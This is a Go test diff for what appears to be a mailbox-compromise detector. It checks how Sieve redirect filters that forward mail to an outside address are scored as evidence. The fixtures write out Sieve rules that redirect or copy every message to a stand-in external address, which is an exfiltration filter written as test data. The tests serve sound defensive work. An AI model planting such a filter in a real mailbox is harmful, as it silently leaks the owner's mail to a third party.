@@ -14,22 +14,22 @@ import (
 func exfilFinding(t *testing.T, mtime time.Time) alert.Finding {
 	t.Helper()
 	path := filepath.Join(t.TempDir(), "roundcube.sieve")
-	if err := os.WriteFile(path, []byte(`if true { redirect :copy "x@freemail.example"; }`), 0o600); err != nil {
+	if err := os.WriteFile(path, []byte(`if true { redirect "x@freemail.example"; }`), 0o600); err != nil {
 		t.Fatal(err)
 	}
 	if err := os.Chtimes(path, mtime, mtime); err != nil {
 		t.Fatal(err)
 	}
 	return alert.Finding{
-		Severity: alert.Warning, Check: "email_filter_exfil",
-		Message:  "real@victim.example: filter copies every message to an external address",
-		Details:  "Mailbox: real@victim.example\nDomain: victim.example\nFile: " + path + "\nDestination: x@freemail.example\nfilter copies every message",
+		Severity: alert.Critical, Check: "email_filter_exfil",
+		Message:  "real@victim.example: filter redirects every message to an external address",
+		Details:  "Mailbox: real@victim.example\nDomain: victim.example\nFile: " + path + "\nDestination: x@freemail.example\nfilter redirects every message",
 		FilePath: path, Mailbox: "real@victim.example", Domain: "victim.example", Timestamp: time.Now(),
 	}
 }
 
-// A redirect planted three months before the reporting incident only ever
-// produced its own Warning; it now counts toward the mailbox's evidence.
+// A redirect planted three months before the reporting incident counts
+// toward the mailbox's evidence, not only its own finding.
 func TestMailFilterRedirectIsEvidence(t *testing.T) {
 	db, _ := evidenceCase(t)
 	created := time.Now().Add(-90 * 24 * time.Hour).Truncate(time.Second)
@@ -122,5 +122,34 @@ func TestInitialScanRedirectIsEvidence(t *testing.T) {
 	again, _ := d.respondToInitialScan(cfg, []alert.Finding{f})
 	if got := findingsOf(again, "email_mailbox_compromise"); len(got) != 0 || len(*calls) != 2 {
 		t.Fatalf("second restart reported %+v, calls %v", got, *calls)
+	}
+}
+
+// copyForwardFinding is a forward that keeps a copy in the mailbox, with
+// nothing else corroborating it: the filter audit reports it for review.
+func copyForwardFinding(t *testing.T) alert.Finding {
+	t.Helper()
+	path := filepath.Join(t.TempDir(), "roundcube.sieve")
+	if err := os.WriteFile(path, []byte(`if true { redirect :copy "x@freemail.example"; }`), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	return alert.Finding{
+		Severity: alert.Warning, Check: "email_filter_exfil",
+		Message:  "real@victim.example: filter copies every message to an external address",
+		Details:  "Mailbox: real@victim.example\nDomain: victim.example\nFile: " + path + "\nDestination: x@freemail.example\nfilter copies every message",
+		FilePath: path, Mailbox: "real@victim.example", Domain: "victim.example", Timestamp: time.Now(),
+	}
+}
+
+// Forwarding mail to another address while keeping a copy is what owners do
+// themselves. Alone it is not evidence: with one login from a new country it
+// must not suspend the mailbox.
+func TestMailFilterCopyForwardIsNotEvidence(t *testing.T) {
+	_, calls := evidenceCase(t)
+	cfg := eximAutoHoldConfig()
+	observeMailboxSignal(cfg, "real@victim.example", newCountry("DE", time.Now().Add(-time.Hour)))
+	got := mailFilterEvidence(cfg, []alert.Finding{copyForwardFinding(t)})
+	if incidents := findingsOf(got, "email_mailbox_compromise"); len(incidents) != 0 || len(*calls) != 0 {
+		t.Fatalf("a copy-keeping forward suspended the mailbox: %+v, uapi %v", incidents, *calls)
 	}
 }
